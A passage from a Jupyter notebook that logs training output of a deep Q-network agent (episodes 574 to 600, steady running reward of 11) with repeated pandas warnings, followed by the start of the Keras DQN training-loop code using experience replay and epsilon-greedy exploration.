      "Running reward: 11.00\t Episode 574\t Frame count: 338000\t Context: 1\n",
      "Running reward: 11.00\t Episode 574\t Frame count: 338100\t Context: 2\n",
      "Running reward: 11.00\t Episode 574\t Frame count: 338200\t Context: 2\n",
      "Running reward: 11.00\t Episode 575\t Frame count: 338300\t Context: 1\n",
      "Running reward: 11.00\t Episode 575\t Frame count: 338400\t Context: 1\n",
      "Running reward: 11.00\t Episode 575\t Frame count: 338500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 575\t Frame count: 338600\t Context: 1\n",
      "Running reward: 11.00\t Episode 575\t Frame count: 338700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 575\t Frame count: 338800\t Context: 1\n",
      "Running reward: 11.00\t Episode 575\t Frame count: 338900\t Context: 1\n",
      "Running reward: 11.00\t Episode 575\t Frame count: 339000\t Context: 1\n",
      "Running reward: 11.00\t Episode 575\t Frame count: 339100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 575\t Frame count: 339200\t Context: 1\n",
      "Running reward: 11.00\t Episode 575\t Frame count: 339300\t Context: 1\n",
      "Running reward: 11.00\t Episode 575\t Frame count: 339400\t Context: 2\n",
      "Running reward: 11.00\t Episode 575\t Frame count: 339500\t Context: 2\n",
      "Running reward: 11.00\t Episode 576\t Frame count: 339600\t Context: 1\n",
      "Running reward: 11.00\t Episode 576\t Frame count: 339700\t Context: 2\n",
      "Running reward: 11.00\t Episode 576\t Frame count: 339800\t Context: 2\n",
      "Running reward: 11.00\t Episode 576\t Frame count: 339900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 576\t Frame count: 340000\t Context: 2\n",
      "Running reward: 11.00\t Episode 576\t Frame count: 340100\t Context: 2\n",
      "Running reward: 11.00\t Episode 577\t Frame count: 340200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 577\t Frame count: 340300\t Context: 2\n",
      "Running reward: 11.00\t Episode 577\t Frame count: 340400\t Context: 2\n",
      "Running reward: 11.00\t Episode 577\t Frame count: 340500\t Context: 2\n",
      "Running reward: 11.00\t Episode 577\t Frame count: 340600\t Context: 2\n",
      "Running reward: 11.00\t Episode 577\t Frame count: 340700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 578\t Frame count: 340800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 578\t Frame count: 340900\t Context: 1\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 341000\t Context: 1\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 341100\t Context: 1\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 341200\t Context: 1\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 341300\t Context: 1\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 341400\t Context: 1\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 341500\t Context: 1\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 341600\t Context: 1\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 341700\t Context: 2\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 341800\t Context: 2\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 341900\t Context: 2\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 342000\t Context: 2\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 342100\t Context: 2\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 342200\t Context: 2\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 342300\t Context: 2\n",
      "Running reward: 11.00\t Episode 578\t Frame count: 342400\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 342500\t Context: 1\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 342600\t Context: 1\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 342700\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 342800\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 342900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 579\t Frame count: 343000\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 343100\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 343200\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 343300\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 343400\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 343500\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 343600\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 343700\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 343800\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 343900\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 344000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 579\t Frame count: 344100\t Context: 2\n",
      "Running reward: 11.00\t Episode 579\t Frame count: 344200\t Context: 2\n",
      "Running reward: 11.00\t Episode 580\t Frame count: 344300\t Context: 1\n",
      "Running reward: 11.00\t Episode 580\t Frame count: 344400\t Context: 1\n",
      "Running reward: 11.00\t Episode 580\t Frame count: 344500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 580\t Frame count: 344600\t Context: 2\n",
      "Running reward: 11.00\t Episode 580\t Frame count: 344700\t Context: 2\n",
      "Running reward: 11.00\t Episode 580\t Frame count: 344800\t Context: 2\n",
      "Running reward: 11.00\t Episode 580\t Frame count: 344900\t Context: 2\n",
      "Running reward: 11.00\t Episode 580\t Frame count: 345000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 581\t Frame count: 345100\t Context: 1\n",
      "Running reward: 11.00\t Episode 581\t Frame count: 345200\t Context: 1\n",
      "Running reward: 11.00\t Episode 581\t Frame count: 345300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 581\t Frame count: 345400\t Context: 1\n",
      "Running reward: 11.00\t Episode 581\t Frame count: 345500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 581\t Frame count: 345600\t Context: 1\n",
      "Running reward: 11.00\t Episode 581\t Frame count: 345700\t Context: 1\n",
      "Running reward: 11.00\t Episode 581\t Frame count: 345800\t Context: 2\n",
      "Running reward: 11.00\t Episode 581\t Frame count: 345900\t Context: 2\n",
      "Running reward: 11.00\t Episode 581\t Frame count: 346000\t Context: 2\n",
      "Running reward: 11.00\t Episode 581\t Frame count: 346100\t Context: 2\n",
      "Running reward: 11.00\t Episode 581\t Frame count: 346200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 582\t Frame count: 346300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 582\t Frame count: 346400\t Context: 1\n",
      "Running reward: 11.00\t Episode 582\t Frame count: 346500\t Context: 1\n",
      "Running reward: 11.00\t Episode 582\t Frame count: 346600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 582\t Frame count: 346700\t Context: 1\n",
      "Running reward: 11.00\t Episode 582\t Frame count: 346800\t Context: 2\n",
      "Running reward: 11.00\t Episode 583\t Frame count: 346900\t Context: 1\n",
      "Running reward: 11.00\t Episode 583\t Frame count: 347000\t Context: 1\n",
      "Running reward: 11.00\t Episode 583\t Frame count: 347100\t Context: 1\n",
      "Running reward: 11.00\t Episode 583\t Frame count: 347200\t Context: 2\n",
      "Running reward: 11.00\t Episode 583\t Frame count: 347300\t Context: 2\n",
      "Running reward: 11.00\t Episode 583\t Frame count: 347400\t Context: 2\n",
      "Running reward: 11.00\t Episode 584\t Frame count: 347500\t Context: 2\n",
      "Running reward: 11.00\t Episode 584\t Frame count: 347600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 584\t Frame count: 347700\t Context: 2\n",
      "Running reward: 11.00\t Episode 584\t Frame count: 347800\t Context: 2\n",
      "Running reward: 11.00\t Episode 584\t Frame count: 347900\t Context: 2\n",
      "Running reward: 11.00\t Episode 585\t Frame count: 348000\t Context: 1\n",
      "Running reward: 11.00\t Episode 585\t Frame count: 348100\t Context: 1\n",
      "Running reward: 11.00\t Episode 585\t Frame count: 348200\t Context: 1\n",
      "Running reward: 11.00\t Episode 585\t Frame count: 348300\t Context: 1\n",
      "Running reward: 11.00\t Episode 585\t Frame count: 348400\t Context: 1\n",
      "Running reward: 11.00\t Episode 585\t Frame count: 348500\t Context: 1\n",
      "Running reward: 11.00\t Episode 585\t Frame count: 348600\t Context: 1\n",
      "Running reward: 11.00\t Episode 585\t Frame count: 348700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 585\t Frame count: 348800\t Context: 1\n",
      "Running reward: 11.00\t Episode 586\t Frame count: 348900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 586\t Frame count: 349000\t Context: 2\n",
      "Running reward: 11.00\t Episode 586\t Frame count: 349100\t Context: 2\n",
      "Running reward: 11.00\t Episode 586\t Frame count: 349200\t Context: 2\n",
      "Running reward: 11.00\t Episode 586\t Frame count: 349300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 586\t Frame count: 349400\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 349500\t Context: 1\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 349600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 587\t Frame count: 349700\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 349800\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 349900\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 350000\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 350100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 587\t Frame count: 350200\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 350300\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 350400\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 350500\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 350600\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 350700\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 350800\t Context: 2\n",
      "Running reward: 11.00\t Episode 587\t Frame count: 350900\t Context: 2\n",
      "Running reward: 11.00\t Episode 588\t Frame count: 351000\t Context: 1\n",
      "Running reward: 11.00\t Episode 588\t Frame count: 351100\t Context: 2\n",
      "Running reward: 11.00\t Episode 588\t Frame count: 351200\t Context: 2\n",
      "Running reward: 11.00\t Episode 589\t Frame count: 351300\t Context: 1\n",
      "Running reward: 11.00\t Episode 589\t Frame count: 351400\t Context: 1\n",
      "Running reward: 11.00\t Episode 589\t Frame count: 351500\t Context: 1\n",
      "Running reward: 11.00\t Episode 589\t Frame count: 351600\t Context: 2\n",
      "Running reward: 11.00\t Episode 590\t Frame count: 351700\t Context: 1\n",
      "Running reward: 11.00\t Episode 590\t Frame count: 351800\t Context: 1\n",
      "Running reward: 11.00\t Episode 590\t Frame count: 351900\t Context: 1\n",
      "Running reward: 11.00\t Episode 590\t Frame count: 352000\t Context: 2\n",
      "Running reward: 11.00\t Episode 591\t Frame count: 352100\t Context: 1\n",
      "Running reward: 11.00\t Episode 591\t Frame count: 352200\t Context: 1\n",
      "Running reward: 11.00\t Episode 591\t Frame count: 352300\t Context: 1\n",
      "Running reward: 11.00\t Episode 591\t Frame count: 352400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 591\t Frame count: 352500\t Context: 1\n",
      "Running reward: 11.00\t Episode 591\t Frame count: 352600\t Context: 1\n",
      "Running reward: 11.00\t Episode 591\t Frame count: 352700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 591\t Frame count: 352800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 591\t Frame count: 352900\t Context: 1\n",
      "Running reward: 11.00\t Episode 591\t Frame count: 353000\t Context: 2\n",
      "Running reward: 11.00\t Episode 591\t Frame count: 353100\t Context: 2\n",
      "Running reward: 11.00\t Episode 591\t Frame count: 353200\t Context: 2\n",
      "Running reward: 11.00\t Episode 591\t Frame count: 353300\t Context: 2\n",
      "Running reward: 11.00\t Episode 592\t Frame count: 353400\t Context: 1\n",
      "Running reward: 11.00\t Episode 592\t Frame count: 353500\t Context: 1\n",
      "Running reward: 11.00\t Episode 592\t Frame count: 353600\t Context: 1\n",
      "Running reward: 11.00\t Episode 592\t Frame count: 353700\t Context: 2\n",
      "Running reward: 11.00\t Episode 593\t Frame count: 353800\t Context: 2\n",
      "Running reward: 11.00\t Episode 594\t Frame count: 353900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 594\t Frame count: 354000\t Context: 1\n",
      "Running reward: 11.00\t Episode 594\t Frame count: 354100\t Context: 2\n",
      "Running reward: 11.00\t Episode 594\t Frame count: 354200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 594\t Frame count: 354300\t Context: 2\n",
      "Running reward: 11.00\t Episode 594\t Frame count: 354400\t Context: 2\n",
      "Running reward: 11.00\t Episode 595\t Frame count: 354500\t Context: 1\n",
      "Running reward: 11.00\t Episode 595\t Frame count: 354600\t Context: 1\n",
      "Running reward: 11.00\t Episode 595\t Frame count: 354700\t Context: 2\n",
      "Running reward: 11.00\t Episode 596\t Frame count: 354800\t Context: 2\n",
      "Running reward: 11.00\t Episode 597\t Frame count: 354900\t Context: 2\n",
      "Running reward: 11.00\t Episode 597\t Frame count: 355000\t Context: 2\n",
      "Running reward: 11.00\t Episode 597\t Frame count: 355100\t Context: 2\n",
      "Running reward: 11.00\t Episode 597\t Frame count: 355200\t Context: 2\n",
      "Running reward: 11.00\t Episode 598\t Frame count: 355300\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 355400\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 355500\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 355600\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 355700\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 355800\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 355900\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 356000\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 356100\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 356200\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 356300\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 356400\t Context: 1\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 356500\t Context: 2\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 356600\t Context: 2\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 356700\t Context: 2\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 356800\t Context: 2\n",
      "Running reward: 11.00\t Episode 599\t Frame count: 356900\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 357000\t Context: 1\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 357100\t Context: 1\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 357200\t Context: 1\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 357300\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 357400\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 357500\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 357600\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 357700\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 357800\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 357900\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 358000\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 358100\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 358200\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 358300\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 358400\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 358500\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 358600\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 358700\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 358800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 600\t Frame count: 358900\t Context: 2\n",
      "Running reward: 11.00\t Episode 600\t Frame count: 359000\t Context: 2\n",
      "DQN terminated at episode 600 with a running reward of 11.0!\n"
     ]
    }
   ],
   "source": [
    "# In the Deepmind paper they use RMSProp however then Adam optimizer\n",
    "# improves training time\n",
    "optimizer = keras.optimizers.Adam(learning_rate=learning_rate, clipnorm=1.0)\n",
    "\n",
    "# Experience replay buffers\n",
    "action_history = []\n",
    "state_history = []\n",
    "state_next_history = []\n",
    "rewards_history = []\n",
    "done_history = []\n",
    "episode_reward_history = []\n",
    "running_reward = 0\n",
    "episode_count = 0\n",
    "frame_count = 0\n",
    "# Number of frames to take random action and observe output\n",
    "epsilon_random_frames = 500\n",
    "# Number of frames for exploration\n",
    "epsilon_greedy_frames = 1000000.0\n",
    "# Maximum replay length\n",
    "# Note: The Deepmind paper suggests 1000000 however this causes memory issues\n",
    "max_memory_length = 10000\n",
    "# Train the model after 4 actions\n",
    "update_after_actions = 4\n",
    "# How often to update the target network\n",
    "update_target_network = 100\n",
    "# Using huber loss for stability\n",
    "loss_function = keras.losses.Huber()\n",
    "\n",
    "analytics = DQNAnalytics()\n",
    "\n",
    "while True:  # Run until solved\n",
    "    state = create_empty_state()\n",
    "    episode_reward = 0\n",
    "    reset_context()\n",
    "    context_actions = 0\n",
    "\n",
    "    analytics.begin_episode()\n",
    "    for timestep in range(1, max_steps_per_episode):\n",
    "        # env.render(); Adding this line would show the attempts\n",
    "        # of the agent in a pop up window.\n",
    "        frame_count += 1\n",
    "\n",
    "        # Use epsilon-greedy for exploration\n",
    "        if frame_count < epsilon_random_frames or epsilon > np.random.rand(1)[0]:\n",
    "            # random action\n",
    "            action = np.random.choice(num_actions)\n",
    "        else:\n",
    "            # Predict action Q-values\n",
    "            # From environment state\n",
    "            action_probs = model(state.reshape(1, features, 1), training=False)\n",
    "            # Take best action\n",
    "            action = tf.argmax(action_probs[0]).numpy()\n",
    "\n",
    "        # Decay probability of taking random action\n",
    "        epsilon -= epsilon_interval / epsilon_greedy_frames\n",
    "        epsilon = max(epsilon, epsilon_min)\n",
    "\n",
    "        # Apply the sampled action in our environment\n",
    "        state_next, reward, done = perform_action(action)\n",
    "        analytics.add_attempt()\n",
    "        state_next = state_next\n",
    "\n",
    "        episode_reward += reward\n",
    "\n",
    "        # If the reward is positive, a context has been solved.\n",
    "        # Keep track of this.\n",
    "        if reward > 0:\n",
